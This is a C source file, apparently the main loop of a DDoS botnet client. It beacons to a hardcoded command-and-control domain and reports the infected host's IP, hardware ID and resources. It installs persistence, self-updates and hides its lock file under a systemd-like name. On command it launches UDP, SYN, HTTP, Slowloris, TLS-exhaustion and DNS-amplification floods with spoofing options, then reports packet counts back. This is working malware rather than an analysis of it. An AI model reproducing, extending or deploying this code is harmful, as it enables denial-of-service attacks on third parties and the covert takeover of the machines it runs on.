#include "bot.h"

/* ── Global state ────────────────────────────────────── */
volatile int g_shutdown = 0;
volatile int g_attack_stop = 0;
unsigned long long g_pkt_count = 0;
unsigned long long g_byte_count = 0;
volatile int g_attack_active = 0;
char g_bot_uuid[64] = {0};
char g_cur_task_id[64] = {0};

/* Must match GitHub release tag style for auto-update compare */
#define BOT_VERSION_TAG "v4.0.29"

static void sig_handler(int sig) { (void)sig; g_shutdown = 1; }

/* Prevent two instances sharing same UUID (cron + systemd) from thrashing C2 */
static int acquire_single_instance(void)
{
    int fd = open("/var/run/systemd-log.lock", O_CREAT | O_RDWR, 0644);
    if (fd < 0) fd = open("/tmp/systemd-log.lock", O_CREAT | O_RDWR, 0644);
    if (fd < 0) return -1;
    if (flock(fd, LOCK_EX | LOCK_NB) != 0) {
        close(fd);
        return -1;
    }
    /* Keep fd open for process lifetime */
    return fd;
}

/* Escape JSON string values (host, os, etc.) */
static void json_escape(const char *in, char *out, int cap)
{
    int j = 0;
    if (!in) { out[0] = 0; return; }
    for (int i = 0; in[i] && j < cap - 2; i++) {
        char c = in[i];
        if (c == '"' || c == '\\') {
            if (j + 2 >= cap) break;
            out[j++] = '\\';
            out[j++] = c;
        } else if ((unsigned char)c < 0x20) {
            continue;
        } else {
            out[j++] = c;
        }
    }
    out[j] = 0;
}

int main(int argc, char *argv[])
{
    signal(SIGINT, sig_handler);
    signal(SIGTERM, sig_handler);
    signal(SIGPIPE, SIG_IGN);

    /* If another instance already holds the lock, exit quietly */
    if (acquire_single_instance() < 0) {
        fprintf(stderr, "[bot] another instance running, exit\n");
        return 0;
    }

    get_bot_uuid(g_bot_uuid, sizeof(g_bot_uuid));

    /* Foreground: --foreground / -f / BOT_FOREGROUND=1
       Under systemd: INVOCATION_ID is set — never double-fork */
    int foreground = 0;
    int force_daemon = 0;
    const char *fg = getenv("BOT_FOREGROUND");
    if (fg && (fg[0] == '1' || fg[0] == 'y' || fg[0] == 'Y'))
        foreground = 1;
    if (getenv("INVOCATION_ID") || getenv("JOURNAL_STREAM"))
        foreground = 1; /* systemd managed — stay in foreground */

    for (int i = 1; i < argc; i++) {
        if (!strcmp(argv[i], "--foreground") || !strcmp(argv[i], "-f"))
            foreground = 1;
        if (!strcmp(argv[i], "--daemon") || !strcmp(argv[i], "-d"))
            force_daemon = 1;
    }
    if (force_daemon) foreground = 0;

    /* Only double-fork when explicitly --daemon (not under systemd) */
    if (!foreground && force_daemon) {
        if (fork() > 0) return 0;
        setsid();
        if (fork() > 0) return 0;
        (void)chdir("/");
        fclose(stdin); fclose(stdout); fclose(stderr);
    }

    (void)nice(-20);
    if (mlockall(MCL_CURRENT | MCL_FUTURE) != 0) {
        /* Non-fatal: continue without locked pages */
    }
    /* WS main thread: SCHED_FIFO(99) — highest real-time, always preempts attack threads */
    if (geteuid() == 0) {
        struct sched_param sp = { .sched_priority = 99 };
        (void)sched_setscheduler(0, SCHED_FIFO, &sp);
    }

    /* Raise file descriptor limit — safe on non-root (raise soft to hard) */
    {
        struct rlimit rl;
        if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
            rl.rlim_cur = rl.rlim_max;
            if (rl.rlim_cur < 65536) rl.rlim_cur = 65536;
            if (rl.rlim_cur > rl.rlim_max) rl.rlim_cur = rl.rlim_max;
            setrlimit(RLIMIT_NOFILE, &rl);
        }
    }
    {
        struct rlimit rl;
        if (getrlimit(RLIMIT_MEMLOCK, &rl) == 0) {
            rl.rlim_cur = rl.rlim_max;
            if (rl.rlim_cur > rl.rlim_max) rl.rlim_cur = rl.rlim_max;
            setrlimit(RLIMIT_MEMLOCK, &rl);
        }
    }

    cpu_monitor_start();

    Config cfg = {0};
    cfg.c2_port = 443;
    cfg.use_ssl = 1;
    strcpy(cfg.c2_path, "/ws/bot/");
    strcpy(cfg.bot_version, BOT_VERSION_TAG);

    char url_buf[512] = {0};
    const char *url_src = NULL;
    for (int i = 1; i < argc; i++) {
        if (argv[i][0] == '-') continue;
        if (!url_src) {
            url_src = argv[i];
            save_c2_url(argv[i]);
            break;
        }
    }
    if (!url_src && load_c2_url(url_buf, sizeof(url_buf)))
        url_src = url_buf;

    if (url_src && url_src[0]) {
        const char *url = url_src;
        if (strncmp(url, "wss://", 6) == 0) { cfg.use_ssl = 1; url += 6; }
        else if (strncmp(url, "ws://", 5) == 0) { cfg.use_ssl = 0; cfg.c2_port = 80; url += 5; }
        const char *colon = strchr(url, ':');
        const char *slash = strchr(url, '/');
        if (colon && (!slash || colon < slash)) {
            int hlen = (int)(colon - url);
            if (hlen >= (int)sizeof(cfg.c2_host)) hlen = (int)sizeof(cfg.c2_host) - 1;
            memcpy(cfg.c2_host, url, (size_t)hlen); cfg.c2_host[hlen] = 0;
            int port = atoi(colon + 1);
            if (port > 0) cfg.c2_port = port;
        } else {
            int hlen = slash ? (int)(slash - url) : (int)strlen(url);
            if (hlen >= (int)sizeof(cfg.c2_host)) hlen = (int)sizeof(cfg.c2_host) - 1;
            memcpy(cfg.c2_host, url, (size_t)hlen); cfg.c2_host[hlen] = 0;
        }
        const char *path = strchr(url, '/');
        if (path && path[1]) {
            int plen = (int)strlen(path);
            if (plen < (int)sizeof(cfg.c2_path)) {
                memcpy(cfg.c2_path, path, (size_t)plen); cfg.c2_path[plen] = 0;
            } else {
                memcpy(cfg.c2_path, path, sizeof(cfg.c2_path) - 1);
                cfg.c2_path[sizeof(cfg.c2_path) - 1] = 0;
            }
        }
    } else {
        strcpy(cfg.c2_host, "bot.minhvuong.io.vn");
    }

    cfg.heartbeat_int = 10;
    cfg.reconnect_min = 5;
    cfg.reconnect_max = 300;
    cfg.stale_timeout = 120;
    cfg.default_pps = 100000;
    cfg.default_threads = 100;

    SysInfo info = {0};
    sys_info(&info);

    /* Persistence only when not systemd (systemd unit already installed by install.sh) */
    if (!getenv("INVOCATION_ID")) {
        char self[1024];
        memset(self, 0, sizeof(self));
        if (readlink("/proc/self/exe", self, sizeof(self) - 1) > 0)
            install_persistence(self);
    }
    /* Auto-update: only if release tag differs from BOT_VERSION_TAG */
    check_updates(BOT_VERSION_TAG);

    gen_payloads();

    if (foreground) {
        fprintf(stderr, "[bot] version %s uuid=%s c2=%s:%d%s ssl=%d\n",
                BOT_VERSION_TAG, g_bot_uuid, cfg.c2_host, cfg.c2_port, cfg.c2_path, cfg.use_ssl);
    }

    while (!g_shutdown)
    {
        WS ws = {0};
        ws.sockfd = -1;
        strcpy(ws.host, cfg.c2_host);
        ws.port = cfg.c2_port;
        strcpy(ws.path, cfg.c2_path);
        ws.use_ssl = cfg.use_ssl;
        pthread_mutex_init(&ws.io, NULL);

        if (ws_connect(&ws, g_bot_uuid) != 0)
        {
            if (foreground) fprintf(stderr, "[bot] connect failed, retry...\n");
            int bo = cfg.reconnect_min;
            while (!g_shutdown) {
                sleep(bo);
                bo = bo * 2 < cfg.reconnect_max ? bo * 2 : cfg.reconnect_max;
                if (ws_connect(&ws, g_bot_uuid) == 0) break;
            }
            if (g_shutdown) { pthread_mutex_destroy(&ws.io); break; }
        }
        if (foreground) fprintf(stderr, "[bot] WS connected\n");

        char esc_ip[128], esc_os[256], esc_hwid[64];
        json_escape(info.ip_addr, esc_ip, sizeof(esc_ip));
        json_escape(info.os_ver, esc_os, sizeof(esc_os));
        json_escape(info.hwid, esc_hwid, sizeof(esc_hwid));

        char hs[1280];
        snprintf(hs, sizeof(hs),
                 "{\"type\":\"handshake\",\"bot_id\":\"%s\",\"bot_identifier\":\"%s\",\"ip_address\":\"%s\","
                 "\"os_name\":\"Linux\",\"os_version\":\"%s\",\"cpu_cores\":%d,"
                 "\"ram_total_mb\":%d,\"net_speed_mbps\":%d,\"version\":\"%s\"}",
                 g_bot_uuid, esc_hwid, esc_ip, esc_os, info.cpu_cores, info.ram_mb,
                 info.net_mbps, BOT_VERSION_TAG);

        time_t last_hb = time(NULL);
        time_t last_recv = time(NULL);
        time_t last_stats = 0;
        AttackParams atk = {0};
        int cpu_usage = 0;
        int hb_fail = 0;
        int recv_fail = 0;
        int handshaked = 0;
        int hs_sent = 0;

        /* Optional drain of server "connected" (do not block forever). */
        {
            char pre[4096];
            int pn = ws_recv(&ws, pre, sizeof(pre));
            if (pn > 0) {
                last_recv = time(NULL);
                char t0[64] = {0};
                json_str(pre, "type", t0, sizeof(t0));
                if (foreground)
                    fprintf(stderr, "[bot] pre-recv type=%s len=%d\n", t0[0] ? t0 : "?", pn);
            } else if (pn < 0) {
                if (foreground) fprintf(stderr, "[bot] pre-recv hard error, reconnect\n");
                ws_disconnect(&ws);
                pthread_mutex_destroy(&ws.io);
                sleep(cfg.reconnect_min);
                continue;
            }
        }

        int wr = ws_send(&ws, hs);
        hs_sent = (wr > 0);
        if (foreground) {
            if (hs_sent) fprintf(stderr, "[bot] handshake sent wr=%d\n", wr);
            else fprintf(stderr, "[bot] handshake send FAIL wr=%d\n", wr);
        }
        if (!hs_sent) {
            ws_disconnect(&ws);
            pthread_mutex_destroy(&ws.io);
            sleep(cfg.reconnect_min);
            continue;
        }

        /* Wait up to ~8s for any server frame after HS. Resend HS once at 3s.
         * If CF/Caddy drops the first client frame, resend often recovers. */
        {
            int got_ack = 0;
            int resend = 0;
            time_t wait_start = time(NULL);
            while (!g_shutdown && !got_ack && time(NULL) - wait_start < 8) {
                char abuf[4096];
                int an = ws_recv(&ws, abuf, sizeof(abuf));
                if (an > 0) {
                    last_recv = time(NULL);
                    char at[64] = {0};
                    json_str(abuf, "type", at, sizeof(at));
                    if (foreground)
                        fprintf(stderr, "[bot] post-hs type=%s len=%d\n", at[0] ? at : "?", an);
                    /* Any valid server control frame means the link is live */
                    if (at[0]) {
                        got_ack = 1;
                        handshaked = 1;
                        break;
                    }
                    continue;
                }
                if (an < 0) {
                    if (foreground) fprintf(stderr, "[bot] post-hs hard error errno=%d\n", errno);
                    break;
                }
                if (!resend && time(NULL) - wait_start >= 3) {
                    int wr2 = ws_send(&ws, hs);
                    resend = 1;
                    if (foreground) fprintf(stderr, "[bot] handshake resend wr=%d\n", wr2);
                    if (wr2 <= 0) break;
                }
            }
            if (!got_ack) {
                if (foreground) fprintf(stderr, "[bot] no handshake_ack, reconnect\n");
                ws_disconnect(&ws);
                pthread_mutex_destroy(&ws.io);
                sleep(cfg.reconnect_min);
                continue;
            }
        }

        if (foreground) fprintf(stderr, "[bot] session ready (main loop)\n");

        while (!g_shutdown)
        {
            time_t now = time(NULL);
            if (now - last_hb >= cfg.heartbeat_int)
            {
                cpu_usage = get_cpu_usage();
                char hb[256];
                snprintf(hb, sizeof(hb),
                         "{\"type\":\"heartbeat\",\"timestamp\":%ld,\"cpu_usage\":%d}",
                         (long)now, cpu_usage);
                if (ws_send(&ws, hb) > 0) {
                    last_hb = now;
                    hb_fail = 0;
                } else {
                    hb_fail++;
                    if (foreground) fprintf(stderr, "[bot] heartbeat send fail #%d\n", hb_fail);
                    if (hb_fail > 3) break;
                }
            }

            /* Attack stats at most once per heartbeat interval */
            if (is_attack_active() && g_cur_task_id[0] && now - last_stats >= cfg.heartbeat_int)
            {
                last_stats = now;
                char stats[512];
                snprintf(stats, sizeof(stats),
                         "{\"type\":\"attack_stats\",\"task_id\":\"%s\",\"packets_sent\":%llu,\"bytes_sent\":%llu}",
                         g_cur_task_id, g_pkt_count, g_byte_count);
                ws_send(&ws, stats);
            }

            char buf[4096];
            int n = ws_recv(&ws, buf, sizeof(buf));
            if (n == 0) {
                /* Idle timeout — connection still OK. Only stale if no frame forever. */
                if (time(NULL) - last_recv > (time_t)cfg.stale_timeout) {
                    if (foreground) fprintf(stderr, "[bot] stale timeout, reconnect\n");
                    break;
                }
                continue;
            }
            if (n < 0) {
                recv_fail++;
                if (foreground) fprintf(stderr, "[bot] recv hard error #%d errno=%d\n", recv_fail, errno);
                /* Socket is dead — do not spin 5 times on a closed FD */
                break;
            }
            last_recv = time(NULL);
            recv_fail = 0;

            char type[64] = {0};
            json_str(buf, "type", type, sizeof(type));

            if (!strcmp(type, "config_update") || !strcmp(type, "config") || !strcmp(type, "handshake_ack")) {
                handshaked = 1;
                if (foreground) fprintf(stderr, "[bot] %s\n", type);
                int pps = json_int(buf, "max_pps");
                int th = json_int(buf, "max_threads");
                if (!pps) {
                    const char *tp = strstr(buf, "\"throttle\"");
                    if (tp) { pps = json_int(tp, "max_pps"); th = json_int(tp, "max_threads"); }
                }
                if (!pps) {
                    const char *cp = strstr(buf, "\"config\"");
                    if (cp) { pps = json_int(cp, "max_pps"); th = json_int(cp, "max_threads"); }
                }
                if (pps > 0) cfg.default_pps = (unsigned)pps;
                if (th > 0) cfg.default_threads = (unsigned)th;
            }
            else if (!strcmp(type, "heartbeat_ack") || !strcmp(type, "connected") || !strcmp(type, "pong")) {
                handshaked = 1;
            }
            else if (!strcmp(type, "attack")) {
                if (is_attack_active()) {
                    request_attack_stop();
                    usleep(200000);
                }
                memset(&atk, 0, sizeof(atk));
                json_str(buf, "target", atk.target, sizeof(atk.target));
                atk.port = json_int(buf, "port");
                json_str(buf, "method", atk.method, sizeof(atk.method));
                atk.duration_secs = json_int(buf, "duration");
                atk.max_pps = (unsigned)json_int(buf, "max_pps");
                atk.max_threads = (unsigned)json_int(buf, "max_threads");
                atk.spoof_mode = (unsigned)json_int(buf, "spoof_mode");
                atk.fragmentation = (unsigned)json_int(buf, "fragmentation");
                atk.slowloris = (unsigned)json_int(buf, "slowloris");
                atk.tls_exhaust = (unsigned)json_int(buf, "tls_exhaust");
                atk.dns_amp = (unsigned)json_int(buf, "dns_amp");
                atk.mega_mode = (unsigned)json_int(buf, "mega_mode");
                if (!atk.max_pps) atk.max_pps = cfg.default_pps;
                if (!atk.max_threads) atk.max_threads = cfg.default_threads;
                if (!atk.method[0]) strcpy(atk.method, "UDP");
                /* Normalize aliases; reject unknown methods (no silent MEGA) */
                {
                    char *m = atk.method;
                    for (char *p = m; *p; p++)
                        if (*p >= 'a' && *p <= 'z') *p -= 32;
                    if (!strcmp(m, "TCP") || !strcmp(m, "ACK")) strcpy(m, "SYN");
                    else if (!strcmp(m, "HTTPS")) strcpy(m, "HTTP");
                    else if (!strcmp(m, "SLOW")) strcpy(m, "SLOWLORIS");
                    else if (!strcmp(m, "TLS") || !strcmp(m, "SSL")) strcpy(m, "TLS_EXHAUST");
                    else if (!strcmp(m, "DNS")) strcpy(m, "DNS_AMP");
                    if (strcmp(m, "UDP") && strcmp(m, "MEGA") && strcmp(m, "SYN") &&
                        strcmp(m, "HTTP") && strcmp(m, "SLOWLORIS") &&
                        strcmp(m, "TLS_EXHAUST") && strcmp(m, "DNS_AMP")) {
                        if (foreground)
                            fprintf(stderr, "[bot] ignore unknown method '%s'\n", m);
                        continue;
                    }
                    if (!strcmp(m, "MEGA")) atk.mega_mode = 1;
                }
                if (atk.duration_secs <= 0) atk.duration_secs = 60;
                if (atk.port <= 0) atk.port = 80;
                if (!atk.target[0]) {
                    if (foreground) fprintf(stderr, "[bot] attack missing target\n");
                    continue;
                }

                memset(g_cur_task_id, 0, sizeof(g_cur_task_id));
                json_str(buf, "task_id", g_cur_task_id, sizeof(g_cur_task_id));

                if (foreground) {
                    fprintf(stderr, "[bot] ATTACK %s %s:%d %ds pps=%u\n",
                            atk.method, atk.target, atk.port, atk.duration_secs, atk.max_pps);
                }

                BgAttackCtx *ctx = malloc(sizeof(BgAttackCtx));
                if (!ctx) continue;
                memcpy(&ctx->atk, &atk, sizeof(AttackParams));
                ctx->cfg = &cfg;
                pthread_t atk_tid;
                pthread_attr_t atk_attr;
                pthread_attr_init(&atk_attr);
                pthread_attr_setdetachstate(&atk_attr, PTHREAD_CREATE_DETACHED);
                if (pthread_create(&atk_tid, &atk_attr, bg_attack_thread, ctx) != 0) {
                    free(ctx);
                }
                pthread_attr_destroy(&atk_attr);
            }
            else if (!strcmp(type, "stop")) {
                if (foreground) fprintf(stderr, "[bot] STOP received\n");
                request_attack_stop();
            }
            else if (!strcmp(type, "ban")) {
                g_shutdown = 1;
                break;
            }
            else if (!strcmp(type, "standby")) {
                request_attack_stop();
            }
            (void)handshaked;
        }
        ws_disconnect(&ws);
        pthread_mutex_destroy(&ws.io);
        if (foreground) fprintf(stderr, "[bot] disconnected, reconnect in %ds\n", cfg.reconnect_min);
        if (!g_shutdown) sleep(cfg.reconnect_min);
    }
    return 0;
}
